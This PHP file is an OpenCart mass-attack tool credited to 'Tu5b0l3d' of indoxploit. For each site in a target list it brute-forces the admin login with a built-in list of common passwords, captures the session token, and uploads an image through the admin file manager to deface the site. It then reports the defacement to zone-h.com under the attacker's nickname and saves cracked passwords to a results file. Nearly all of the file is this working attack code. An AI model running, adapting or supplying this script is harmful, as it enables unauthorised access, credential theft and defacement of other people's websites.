<?php
// Coded by Tu5b0l3d
// indoxploit.or.id
// thx to: magelang6etar, spyhackerz.com
// opencart bf + upload image.

error_reporting(0);
if(!is_file($argv[1])){
	echo "\033[01;32m\ntarget.htm\n\033[01;35mwww.site1.com<br>www.site2.com\n\n\033[01;32mUsage: \033[01;35m$argv[0] target.htm\n";
}
else{

$nama = $argv[1];
$file = "k.png"; //file
$kate = "image/png"; //mimetype, change if you not png
$nick = "gantenggggg"; // here put ur name on zone-h

$buka=fopen("$nama","r");
$size=filesize("$nama");
$baca=fread($buka,$size);
$sites = explode("<br>", $baca);
cover();
foreach($sites as $sitesn){
$passwords = "admin
demo
admin123
123456
123456789
123
1234
12345
1234567
12345678
123456789
admin1234
admin123456
pass123
root
321321
123123
112233
102030
password
pass
qwerty
abc123
654321
pass1234";
$site = "http://$sitesn";
$urlqs = parse_url($site, PHP_URL_HOST);
$urlq = "http://$urlqs";
$redirect = "$urlq/admin/";
$redirect2 = "$urlq/admin";
echo "$urlq";
$password = explode("\n", $passwords);
$cek_1 = file_get_contents("$redirect");
if(preg_match("/common\/forgotten/", $cek_1)){
foreach($password as $pw){


$data = array("username" => "admin",
		"password" => "$pw");
$login_ah = yuk_login($redirect, $data);

if(preg_match("/logout/i", $login_ah)){
	echo "\n=> pass: \033[01;32m$pw\033[0m\n";
	save("<a href=\"$redirect\">$redirect</a> | $pw<br>");
	$perek1 = "token=(.*?)\">Settings<\/a><\/li>";
	$toket = nyari_link($login_ah, $perek1);
	echo "=> toket: \033[01;35m$toket\033[0m\n";
	$site_upload = "$redirect2/index.php?route=common/filemanager/upload&token=$toket";
	echo "=> \033[01;32mUploading...\033[0m\n";
	$cfile = curl_file_create("$file","$kate","$file");
	$data2 = array('image' => "$cfile", "directory" => "");
	$upload = yuk_login($site_upload, $data2);
	if(preg_match("/Your file has been uploaded/i", $upload)){
		echo "=> \033[01;32mOk\033[0m\n=> $urlq/image/data/$file\n";
		echo "-> zone-h: ";
		echo jon("$urlq/image/data/$file",$nick);
		save("<a href='$urlq/image/data/$file'>$urlq/image/data/$file</a><br>");
		
	}
	else{
		echo "\033[01;31m => No\033[0m\n\n";
	}
	break; 
}
else{
	echo "\n\033[0;34m$pw <= \033[01;31mNo\033[0m";
}
} 
} else{
	echo "\033[01;31m => Not Vuln\033[0m\n\n";
}
}
}

function yuk_login($lingnya, $data){

	$ch2 = curl_init ("$lingnya");
					curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt ($ch2, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt ($ch2, CURLOPT_SSL_VERIFYHOST, 0);
					curl_setopt ($ch2, CURLOPT_POST, 1);
					curl_setopt ($ch2, CURLOPT_POSTFIELDS, $data);
					curl_setopt($ch2, CURLOPT_COOKIEJAR,'coker_log');
				curl_setopt($ch2, CURLOPT_COOKIEFILE,'coker_log');
					$data2 = curl_exec ($ch2);
					return $data2;
}

function cover(){
	echo "\n\t\t### \033[0;36mCoded By Tu5b0l3d\033[0m ###\n\t\t\033[0;33mwww.indoxploit.blogspot.com\033[0m\n\n";
}

function save($data){
		$fp = @fopen("result_opencart.htm", "a") or die("cant open file");
		fwrite($fp, $data);
		fclose($fp);
}

 function curl_file_create($filename, $mimetype = '', $postname = '') {
        return "@$filename;filename="
            . ($postname ?: basename($filename))
            . ($mimetype ? ";type=$mimetype" : '');
   }


function nyari_link($param, $perek){
	preg_match("/$perek/", $param, $ini_dia);
	return $ini_dia[1];
}

function jon($site, $nick){
$ch3 = curl_init ("http://www.zone-h.com/notify/single");
						curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt ($ch3, CURLOPT_POST, 1);
						curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$site&hackmode=1&reason=1&submit=Send");  
						
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " Ok\n\n";
        }else{
                echo " No\n\n"; }
}
?>
